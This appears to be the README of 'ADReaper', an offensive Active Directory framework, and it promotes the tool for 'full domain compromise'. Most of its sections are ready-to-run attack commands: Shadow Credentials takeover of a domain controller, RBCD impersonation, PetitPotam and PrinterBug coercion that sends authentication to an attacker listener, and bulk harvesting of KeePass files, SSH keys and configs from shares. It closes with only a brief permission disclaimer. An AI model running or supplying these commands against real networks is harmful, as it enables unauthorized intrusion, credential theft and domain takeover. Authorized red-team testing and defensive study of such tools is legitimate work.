# ⚔️ ADREAPER: Advanced Active Directory Exploitation Framework 🛡️

```text
 █████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████║██║  ██║██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██║██║  ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                              @adreaper v3.5.0
```

**ADReaper** is a high-performance, expert-tier reconnaissance and offensive security framework designed for stealthy and efficient Active Directory engagements. Engineered for portability and protocol fidelity, it provides Red Teams with the precision tools required to escalate from unauthenticated discovery to full domain compromise.

---

## 📑 Strategic Operational Phases

1.  **[Infrastructure Reconnaissance](#-infrastructure-reconnaissance)**: Protocol-level service discovery and deep host fingerprinting.
2.  **[Identity Intelligence](#-identity-intelligence)**: Advanced LDAP enumeration and tactical object analysis.
3.  **[Tactical Exploitation](#-tactical-exploitation)**: Modern AD attack vectors (Shadow Credentials, RBCD, Relay Triggers).
4.  **[Graph Ingestion](#-graph-ingestion)**: Direct telemetry pipe for BloodHound/Neo4j analysis.
5.  **[Intelligence Reporting](#-intelligence-reporting)**: Unified workspace management and interactive mission dashboards.

---

## ⚙️ Core Configuration (Persistent Flags)

| Flag | Shorthand | Description | Security Context |
| :--- | :--- | :--- | :--- |
| `--domain` | `-d` | Target AD Domain (FQDN) | Required for all modules |
| `--dc-ip` | | Domain Controller IP Address | Primary target for reconnaissance |
| `--username` | `-u` | Authentication Principal | Supports UPN or SAM formats |
| `--password` | `-p` | Authentication Secret | Cleartext credential |
| `--hash` | | NTLM Hash (LM:NT) | Enables standard Pass-the-Hash |
| `--output` | `-o` | Workspace Root | Defaults to `./workspace` |
| `--verbose` | `-v` | Debug Verbosity | Intense protocol-level logging |

---

## 🔍 Infrastructure Reconnaissance

### `infra scan` — Advanced Service Discovery
Optimized multi-threaded TCP scanner with heuristic OS detection and service banner analysis.

```powershell
# High-precision scan against core AD services
.\adreaper.exe infra scan -t 10.10.1.5 --ports 88,135,389,445,636,3389

# Aggressive Nmap-style recon (Full fingerprinting + No-Ping)
.\adreaper.exe infra scan -t 10.10.1.5 -Pn -A --ports all

# Stealthy banner extraction and export
.\adreaper.exe infra scan -t 10.10.1.10 --save infra_summary.txt
```

### `infra dns` — DC Locator
Discover internal AD infrastructure through service location (SRV) records.

```powershell
# Identify DCs, Global Catalogs, and KDCs
.\adreaper.exe infra dns -d corp.local
```

---

## 👤 Identity Intelligence

### `enum users` — Targeted Identity Extraction
Advanced filtering to identify low-hanging fruit and high-value targets.

```powershell
# Strategic Hunt: Find Kerberoastable (SPN) & AS-REP Roastable accounts
.\adreaper.exe enum users -d corp.local --spn-only --asrep-only

# Privilege Hunt: Identify accounts with AdminCount=1 or Delegation configured
.\adreaper.exe enum users --admin-only --deleg
```

### `enum tree` — Visual Share Cartography
Recursive, visual mapping of remote file systems via SMB.

```powershell
# Map the entire accessible SMB surface (All Shares)
.\adreaper.exe enum tree -s all --depth 2 -d corp.local

# Visual explorer for specific high-value shares
.\adreaper.exe enum tree -s "C$" --path "Users/Public" -d corp.local
```

### `enum adcs` — PKI Misconfiguration Analysis
Enumerates Certificate Authorities and templates to flag ESC1-ESC8 vulnerabilities.

---

## ⚔️ Tactical Exploitation

### `attack shadow` — Shadow Credentials
The modern way to take over computer accounts without needing tickets or hashes.

```powershell
# Domain Controller/Server Takeover (Requires WriteProperty over target)
.\adreaper.exe attack shadow -t DC01 -d corp.local
```

### `attack rbcd` — Resource-Based Constrained Delegation
Orchestrates the modification of `msDS-AllowedToActOnBehalfOfOtherIdentity` for impersonation.

```powershell
# Configure impersonation: Allow ATTACKER$ to act as DA on the target
.\adreaper.exe attack rbcd -t FILE-SRV -M ATTACKER$
```

### `attack relay` — Forced Authentication Triggers
Weaponized PetitPotam and PrinterBug implementations for NTLM relaying.

```powershell
# Force machine authentication to your listener
.\adreaper.exe attack relay -t DC01 -m petitpotam --listener 10.10.10.5
```

### `attack harvest` — Precision Loot Collection
Automated search and extraction of sensitive files (KeePass, SSH keys, Configs).

```powershell
# Global loot hunt across all shares
.\adreaper.exe attack harvest -e kdbx,ssh,conf,xlsx,pdf -d corp.local
```

---

## 📊 Intelligence Reporting

ADReaper centralizes mission evidence into an interactive **Intelligence Dashboard**.

- **report.html**: A professional, Red Team-ready dashboard featuring a universal JSON explorer.
- **Unified Discovery**: The dashboard automatically aggregates all `.json` findings within the workspace.
- **Portability**: The report is a standalone artifact requiring no backend infrastructure.

---

## 🛡️ Operational Excellence

- **Protocol Purity**: No dependency on `net.exe` or `powershell.exe`. Pure Go implementation of LDAP, SMB, and Kerberos.
- **Threaded Precision**: Optimized worker pools for massive horizontal reconnaissance.
- **OPSEC Aware**: Designed to minimize forensic footprint during enumeration.

---

**Crafted for precision. Optimized for results.** ⚔️🔥🚀

ADReaper is a powerful security testing tool. It must only be used on systems where you have explicit, written permission from the owner. Unauthorized access to computer systems is illegal and unethical.

---
**Crafted for the elite. Use with precision.** 🛡️⚔️🔥
